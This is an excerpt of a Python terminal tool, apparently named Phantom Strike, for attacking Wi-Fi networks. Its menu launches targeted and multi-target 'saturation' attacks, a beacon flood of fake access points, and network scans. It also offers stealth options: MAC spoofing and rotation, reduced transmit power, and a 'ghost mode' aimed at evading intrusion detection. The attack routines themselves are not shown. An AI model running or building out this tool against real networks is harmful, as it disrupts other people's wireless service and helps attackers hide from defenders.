            raw = Prompt.ask("[bold magenta]Rotation interval (seconds)", default="30")
            if raw.isdigit() and int(raw) >= 5:
                stealth["rotate_secs"] = int(raw)
        elif c == "4":
            stealth["reduce_power"] = not stealth["reduce_power"]
        elif c == "5":
            raw = Prompt.ask("[bold magenta]TX power (dBm, 1-20)", default="5")
            if raw.isdigit() and 1 <= int(raw) <= 20:
                stealth["power_dbm"] = int(raw)
        elif c == "6":
            stealth["ghost_mode"] = not stealth["ghost_mode"]
        console.print()

# ── Main menu ─────────────────────────────────────────────────────────────────

def main_menu(mon: str):
    while True:
        show_banner()

        stealth_line = (
            f"[bold magenta]  ◈ STEALTH ACTIVE  ·  MAC rotating /{stealth['rotate_secs']}s  ·  TX {stealth['power_dbm']}dBm[/]"
            if stealth["enabled"] else
            "[dim]  Stealth: OFF — configure in menu option 5[/]"
        )
        console.print(Align.center(
            f"[dim]Monitor interface: [bold cyan]{mon}[/]   "
            f"[dim]Current MAC: [bold cyan]{current_mac}[/]\n"
        ))
        console.print(Align.center(stealth_line + "\n"))

        choices = Panel(
            f"  [bold red]1[/]  [bold white]TARGETED STRIKE[/]  [dim]— wifite-style: scan → lock → auto-attack[/]\n\n"
            f"  [bold red]2[/]  [bold white]AREA BLAST[/]       [dim]— multi-target simultaneous saturation[/]\n\n"
            f"  [bold red]3[/]  [bold white]BEACON FLOOD[/]     [dim]— fill airspace with fake APs (IDS ghost mode)[/]\n\n"
            f"  [bold red]4[/]  [bold white]QUICK SCAN[/]       [dim]— survey nearby APs and export to JSON[/]\n\n"
            f"  [bold magenta]5[/]  [bold magenta]STEALTH CONFIG[/]   [dim]— MAC spoof · rotation · TX power · ghost mode[/]\n\n"
            f"  [bold red]0[/]  [bold white]EXIT[/]\n",
            title="[bold white on red]  ◈ PHANTOM STRIKE — MAIN MENU  [/]",
            border_style="red", box=box.DOUBLE_EDGE, padding=(1, 4)
        )
        console.print(Align.center(choices))

        mode = Prompt.ask("\n[bold yellow]Select mode", choices=["0","1","2","3","4","5"], default="1")

        if mode == "0":
            cleanup()
        elif mode == "1":
            mode_targeted(mon)
        elif mode == "2":
            mode_area_blast(mon)
        elif mode == "5":
            stealth_config_screen()
            continue
        elif mode == "3":
            console.rule("[bold red]◈ BEACON FLOOD[/]")
            raw = Prompt.ask("[bold yellow]Custom SSIDs (comma-separated, or blank for random)")
            ssids = [s.strip() for s in raw.split(",")] if raw.strip() else None
            ch_raw = Prompt.ask("[bold yellow]Channel (blank to hop all)", default="")
            ch = int(ch_raw) if ch_raw.isdigit() else None
            attack_beacon(mon, ssids, ch)
            fake_target = {"ssid": "BEACON FLOOD", "bssid": "broadcast", "ch": str(ch or "all")}
            live_attack_panel(fake_target, "BEACON FLOOD (ghost mode)", 1)
        elif mode == "4":
            aps = scan_aps(mon, 30)
            if aps:
                out = f"/home/core/phantom-wifi/scan_{datetime.now():%Y%m%d_%H%M%S}.json"
                with open(out, "w") as f:
                    json.dump(aps, f, indent=2)
                console.print(render_ap_table(aps))
                console.print(f"\n[green]✓ Saved to {out}[/]")
            input("\nPress Enter to return to menu...")

        _kill_all()


# ── Entry ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    show_banner()
    console.rule("[bold red]INITIALIZATION[/]")
    iface = select_interface()
    mon   = enable_monitor(iface)
    main_menu(mon)
